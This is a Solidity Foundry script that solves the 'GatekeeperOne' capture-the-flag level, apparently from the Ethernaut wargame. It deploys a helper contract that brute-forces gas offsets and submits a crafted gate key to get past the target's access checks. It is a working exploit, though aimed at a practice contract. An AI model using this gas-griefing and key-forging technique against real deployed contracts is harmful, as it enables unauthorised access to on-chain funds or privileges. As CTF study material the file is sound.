// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Enter {
    GatekeeperOne gkOne;

    constructor(address _gkAddress) {
        gkOne = GatekeeperOne(_gkAddress);
    }

    function enter(bytes8 _gateKey) external returns (bool) {
        bytes memory callEnter = abi.encodeCall(GatekeeperOne.enter, _gateKey);
        for (uint i = 0; i < 300; i++) {
            (bool success, ) = address(gkOne).call{gas: (8191 * 3) + i}(
                callEnter
            );
            if (success) {
                return true;
            }
        }
        return false;
    }
}

contract GatekeeperOneSolution is Script {
    GatekeeperOne public constant gateKeeperOneInstance =
        GatekeeperOne(0x35BF6F9FE8deF4f1BD26663568671a520848d56C);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Enter enter = new Enter(address(gateKeeperOneInstance));

        bool success = enter.enter(0x4000000000004Bfc);
        require(success, "J failed");
        vm.stopBroadcast();
    }
}
